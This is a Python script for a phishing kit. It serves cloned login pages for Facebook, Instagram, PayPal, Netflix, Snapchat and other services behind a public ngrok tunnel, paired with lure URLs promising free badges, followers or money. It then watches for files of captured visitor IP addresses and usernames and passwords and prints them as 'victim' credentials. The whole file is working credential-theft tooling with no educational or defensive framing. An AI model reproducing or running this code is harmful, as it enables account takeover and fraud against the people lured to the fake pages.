import os,json,time,sys
def slowprint(s):
 	  for c in s + '\n':
 	      sys.stdout.write(c)
 	      sys.stdout.flush()
 	      time.sleep(0.0006/ 100)
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
os.system("chmod +x Abir/ngrok*")
os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
os.system("killall php> /dev/null 2>&1")
os.system("lolcat /A-PHIS.py")
main_opt=str(input(red+"\n[★] Select Your Option : "+yellow))

if main_opt=="01" or main_opt=="1":
	website="facebook"
	mask='http://blue-verified-badge-for-facebook-free'
elif main_opt=="2" or main_opt=="02":
	website="github"
	mask='http://get-blue-badge-on-twitter-free'
elif main_opt=="3" or main_opt=="03":
	website="instagram"
	mask='http://get-unlimited-followers-for-instagram'
elif main_opt=="4" or main_opt=="04":
	website="google"
	mask='http://get-unlimited-google-drive-free'
elif main_opt=="5" or main_opt=="05":
	website="gitlab"
	mask='http://gitlab-sinup'
elif main_opt=="6" or main_opt=="06":
	website="Spotify"
	mask='http://get-a-premium-plan-for-spotify-free'
elif main_opt=="7" or main_opt=="07":
	website="netflix"
	mask='http://upgrade-your-netflix-plan-free'
elif main_opt=="8" or main_opt=="08":
	website="tiktok"
	mask='http://tiktok-free-liker'
elif main_opt=="9" or main_opt=="09":
	website="yahoo"
	mask='http://grab-mail-from-anyother-yahoo-account-free'
elif main_opt=="10" or main_opt=="010":
	website="paypal"
	mask='http://get-500-usd-free-to-your-acount'
elif main_opt=="11":
	website="snapchat"
	mask='http://view-locked-snapchat-accounts-secretly'
elif main_opt=="12":
	website="messanger"
elif main_opt=="13":
	website="fb_security"
elif main_opt=="14":
	website="twitter"
else:
	os.system("python AH-PHISING.py")
os.system("clear")
os.system("cd site/"+website+"/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
os.system("clear")
def an():
	os.system("lolcat /phislogo.py")
	print()
	print(""+green+"plz wait  few seconde and  on your hotspot else its well not work")
	print()
	print("                "+yellow+"your phising is started>>>>>>>>")
	print()
	print("                        "+cyan+"ngrok start")
	print()
	print("                     "+cyan+"count down start")
an()
time.sleep(5)
print("""   
  $$\   
$$$$ |  
\_$$ |  
  $$ |  
  $$ |  
  $$ |  
$$$$$$\ 
\______|
        
        
        
   """)
time.sleep(1)
os.system("clear")
an()
print("""
 $$$$$$\  
$$  __$$\ 
\__/  $$ |
 $$$$$$  |
$$  ____/ 
$$ |      
$$$$$$$$\ 
\________|
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
 $$$$$$\  
$$ ___$$\ 
\_/   $$ |
  $$$$$ / 
  \___$$\ 
$$\   $$ |
\$$$$$$  |
 \______/ 
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
$$\   $$\ 
$$ |  $$ |
$$ |  $$ |
$$$$$$$$ |
\_____$$ |
      $$ |
      $$ |
      \__|
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
$$$$$$$\  
$$  ____| 
$$ |      
$$$$$$$\  
\_____$$\ 
$$\   $$ |
\$$$$$$  |
 \______/ 
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
 $$$$$$\  
$$  __$$\ 
$$ /  \__|
$$$$$$$\  
$$  __$$\ 
$$ /  $$ |
 $$$$$$  |
 \______/ 
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
$$$$$$$$\ 
\____$$  |
    $$  / 
   $$  /  
  $$  /   
 $$  /    
$$  /     
\__/      
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
 $$$$$$\  
$$  __$$\ 
$$ /  $$ |
 $$$$$$  |
$$  __$$< 
$$ /  $$ |
\$$$$$$  |
 \______/ 
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
 $$$$$$\  
$$  __$$\ 
$$ /  $$ |
\$$$$$$$ |
 \____$$ |
$$\   $$ |
\$$$$$$  |
 \______/ 
          
          
          
""")
time.sleep(1)
os.system("clear")
an()
print("""
  $$\   $$$$$$\  
$$$$ | $$$ __$$\ 
\_$$ | $$$$\ $$ |
  $$ | $$\$$\$$ |
  $$ | $$ \$$$$ |
  $$ | $$ |\$$$ |
$$$$$$\\$$$$$$  /
\______|\______/ 
                 
                 
                 
""")
time.sleep(1)
os.system("clear")
os.system("lolcat /phislogo.py")
print()
os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
with open('tunnels.json') as data_file:    
    datajson = json.load(data_file)
msg = (""+green+"Your link is:"+blue+" ")
for i in datajson['tunnels']:
    msg = msg + i['public_url']+ '\n'+''+green+'Your link is : '+cyan+''
os.system('clear')
os.system("lolcat /phislogo.py")
print()
print("       if you face any error plz restart this tool again")
print()
print()
print (msg)
print()
print()
print("       if you face any error plz restart this tool again")
print()
print()
while True:
	if os.path.isfile("site/"+website+"/ip.txt")==True:
		jop=open("site/"+website+"/ip.txt","r")
		ip2=jop.readline()
		ip=jop.readline().strip("IP:")
		print("\n [√]Someone Visited the Site ip address: "+ip)
		jop.close()
		os.system("rm -rf site/"+website+"/ip.txt")
	if os.path.isfile("site/"+website+"/usernames.txt")==True:
		abir=open("site/"+website+"/usernames.txt","r")
		Ah=abir.readline()
		start=int(Ah.find("Username:"))
		end=int(Ah.find("Pass:"))
		print("\t"+red+"victim username : "+Ah[start+9:end])
		print("\t"+red+"victim Password : "+Ah[end+5:])
		abir.close()
		os.system("rm -rf site/"+website+"/usernames.txt")
